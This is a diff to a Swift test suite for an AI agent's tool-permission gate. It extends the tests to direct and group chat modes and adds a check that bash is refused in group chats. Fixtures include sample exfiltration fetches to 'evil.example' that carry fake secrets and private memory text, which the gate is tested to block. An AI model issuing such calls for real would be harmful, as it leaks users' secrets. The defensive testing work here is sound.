@@ -15,7 +15,8 @@ private func makeDispatchContext(
   sessionHasPrivate: Bool = false,
   approvalPending: Bool = false,
   origin: RunOrigin = .interactive,
-  windowOpen: Bool = false
+  windowOpen: Bool = false,
+  mode: ChatMode = .direct
 ) -> ToolDispatchContext {
   ToolDispatchContext(
     runId: runId,
@@ -27,7 +28,8 @@ private func makeDispatchContext(
     sessionHasPrivateData: sessionHasPrivate,
     approvalAlreadyPending: approvalPending,
     runOrigin: origin,
-    autoApproveWindowOpen: windowOpen
+    autoApproveWindowOpen: windowOpen,
+    mode: mode
   )
 }
 
@@ -288,7 +290,8 @@ private struct ProbedDangerousTool: Tool {
     sessionHasPrivate: Bool = false,
     approvalPending: Bool = false,
     origin: RunOrigin = .interactive,
-    windowOpen: Bool = false
+    windowOpen: Bool = false,
+    mode: ChatMode = .direct
   ) -> ToolDispatchContext {
     makeDispatchContext(
       tainted: tainted,
@@ -298,7 +301,8 @@ private struct ProbedDangerousTool: Tool {
       sessionHasPrivate: sessionHasPrivate,
       approvalPending: approvalPending,
       origin: origin,
-      windowOpen: windowOpen
+      windowOpen: windowOpen,
+      mode: mode
     )
   }
 
@@ -355,13 +359,14 @@ private struct ProbedDangerousTool: Tool {
     }
   }
 
-  @Test func unconditionalTierBlocksFetchAndSearchAlways() async {
+  @Test(arguments: [ChatMode.direct, ChatMode.group])
+  func unconditionalTierBlocksFetchAndSearchAlways(mode: ChatMode) async {
     // given — no taint, no private data: tier 1/2 still block (FR-T6)
     let gate = makeGate()
     let fetchVerdict = await gate.evaluate(
       call: fetchCall("https://evil.example/?t=s3cret-value-1"),
       tool: FetchLikeTool(),
-      context: makeContext()
+      context: makeContext(mode: mode)
     )
     let searchVerdict = await gate.evaluate(
       call: ToolCall(
@@ -370,7 +375,7 @@ private struct ProbedDangerousTool: Tool {
         argumentsJSON: #"{"query":"sk-abcdefghijklmnop1234"}"#
       ),
       tool: SearchLikeTool(),
-      context: makeContext()
+      context: makeContext(mode: mode)
     )
 
     // then
@@ -401,7 +406,7 @@ private struct ProbedDangerousTool: Tool {
     )
 
     // then — allowed, but the audit rendering still redacts the shaped token
-    guard case .allow(let argsRedacted, _) = verdict else {
+    guard case .allow(let argsRedacted, _, _) = verdict else {
       Issue.record("expected allow, got \(verdict)")
       return
     }
@@ -435,13 +440,14 @@ private struct ProbedDangerousTool: Tool {
     }
   }
 
-  @Test func tierThreeWinsOverApprovalUnderTrifecta() async {
+  @Test(arguments: [ChatMode.direct, ChatMode.group])
+  func tierThreeWinsOverApprovalUnderTrifecta(mode: ChatMode) async {
     // given — args carrying a MEMORY.md substring: redaction-block WINS over approval (FR-T6)
     let sixteen = String(Self.memoryText.dropFirst(10).prefix(16))
     let verdict = await makeGate().evaluate(
       call: fetchCall("https://evil.example/?d=\(sixteen)"),
       tool: FetchLikeTool(),
-      context: makeContext(tainted: true, assemblyPrivate: true)
+      context: makeContext(tainted: true, assemblyPrivate: true, mode: mode)
     )
 
     // then
@@ -545,7 +551,8 @@ private struct ProbedDangerousTool: Tool {
     #expect(recorded.reason == .askTier)
   }
 
-  @Test func askTierEgressRunsArgumentGuardsBeforeApproval() async {
+  @Test(arguments: [ChatMode.direct, ChatMode.group])
+  func askTierEgressRunsArgumentGuardsBeforeApproval(mode: ChatMode) async {
     // given an ask-tier arbitrary-destination tool, matching the MCP policy declarations
     let tool = FetchLikeTool(name: "mcp__linear__create_issue", riskLevel: .ask)
     let privateSubstring = String(Self.memoryText.dropFirst(10).prefix(16))
@@ -558,7 +565,7 @@ private struct ProbedDangerousTool: Tool {
         argumentsJSON: #"{"url":"https://mcp.example/?token=s3cret-value-1"}"#
       ),
       tool: tool,
-      context: makeContext()
+      context: makeContext(mode: mode)
     )
     let conditional = await makeGate().evaluate(
       call: ToolCall(
@@ -567,7 +574,7 @@ private struct ProbedDangerousTool: Tool {
         argumentsJSON: #"{"url":"https://mcp.example/?body=\#(privateSubstring)"}"#
       ),
       tool: tool,
-      context: makeContext(tainted: true, assemblyPrivate: true)
+      context: makeContext(tainted: true, assemblyPrivate: true, mode: mode)
     )
 
     // then neither match can become an approvable action
@@ -717,7 +724,7 @@ private struct ProbedDangerousTool: Tool {
     let verdict = await gate.evaluate(call: call, tool: FetchLikeTool(), context: context)
 
     // then — the fetch is allowed on its resolved target; no approval
-    guard case .allow(_, let action) = verdict else {
+    guard case .allow(_, let action, _) = verdict else {
       Issue.record("expected .allow, got \(verdict)")
       return
     }
@@ -918,7 +925,8 @@ private struct ProbedDangerousTool: Tool {
     #expect(refusedPayload.content == "bad stage")
   }
 
-  @Test func dangerousUnconditionalScanRunsWithoutNetwork() async {
+  @Test(arguments: [ChatMode.direct, ChatMode.group])
+  func dangerousUnconditionalScanRunsWithoutNetwork(mode: ChatMode) async {
     // given
     let encodedSecret = "s3cret%2Dvalue%2D1"
     let action = dangerousAction(
@@ -932,7 +940,7 @@ private struct ProbedDangerousTool: Tool {
     let verdict = await makeGate(enabledDangerousTools: ["execute_code"]).evaluate(
       call: ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}"),
       tool: tool,
-      context: makeContext()
+      context: makeContext(mode: mode)
     )
 
     // then
@@ -944,7 +952,8 @@ private struct ProbedDangerousTool: Tool {
     #expect(argsRedacted.contains(encodedSecret) == false)
   }
 
-  @Test func privateSubstringTierDependsOnlyOnPreparedCanExfiltrate() async {
+  @Test(arguments: [ChatMode.direct, ChatMode.group])
+  func privateSubstringTierDependsOnlyOnPreparedCanExfiltrate(mode: ChatMode) async {
     // given
     let privateText = Self.memoryText
     let guardTexts = ["send " + String(privateText.prefix(16))]
@@ -958,14 +967,28 @@ private struct ProbedDangerousTool: Tool {
     let call = ToolCall(id: "e1", name: "execute_code", argumentsJSON: "{}")
 
     // when
-    let allowedToPark = await gate.evaluate(call: call, tool: noNetwork, context: makeContext())
-    let blocked = await gate.evaluate(call: call, tool: networked, context: makeContext())
+    let allowed = await gate.evaluate(call: call, tool: noNetwork, context: makeContext(mode: mode))
+    let blocked = await gate.evaluate(
+      call: call,
+      tool: networked,
+      context: makeContext(mode: mode)
+    )
 
     // then
-    guard case .requireApproval = allowedToPark,
-      case .block(let blockedPayload, _) = blocked
-    else {
-      Issue.record("expected no-network park and networked private-substring block")
+    switch mode {
+    case .direct:
+      guard case .requireApproval = allowed else {
+        Issue.record("expected the direct no-network action to park")
+        return
+      }
+    case .group:
+      guard case .allow = allowed else {
+        Issue.record("expected the group no-network action to execute untapped")
+        return
+      }
+    }
+    guard case .block(let blockedPayload, _) = blocked else {
+      Issue.record("expected the networked private-substring action to block")
       return
     }
     #expect(blockedPayload.status == .blockedArgs)
@@ -1062,6 +1085,33 @@ private struct ProbedDangerousTool: Tool {
       return
     }
     #expect(recorded.tool == "bash")
+  }
+
+  @Test func interactiveOnlyToolIsRefusedInAGroupTopic() async {
+    // given — a live group turn, where the dangerous tier runs untapped and nobody is the owner
+    let bash = PreparedDangerousTool(
+      resolution: .prepared(dangerousAction()),
+      name: "bash",
+      requiresInteractiveRun: true
+    )
+    let gate = makeGate(enabledDangerousTools: ["bash"])
+
+    // when
+    let verdict = await gate.evaluate(
+      call: ToolCall(id: "b1", name: "bash", argumentsJSON: "{}"),
+      tool: bash,
+      context: makeContext(origin: .interactive, mode: .group)
+    )
+
+    // then — refused outright, never widened into the untapped group path
+    guard case .block(let payload, _) = verdict else {
+      Issue.record("expected a group refusal, got \(verdict)")
+      return
+    }
+    #expect(payload.status == .error)
+    #expect(payload.content.contains("bash"))
+    #expect(payload.content.contains("group chat"))
+    #expect(payload.content.contains("owner is present"))
   }
 
   @Test func aBackgroundRunLeavesToolsThatDoNotNeedTheOwnerAlone() async {
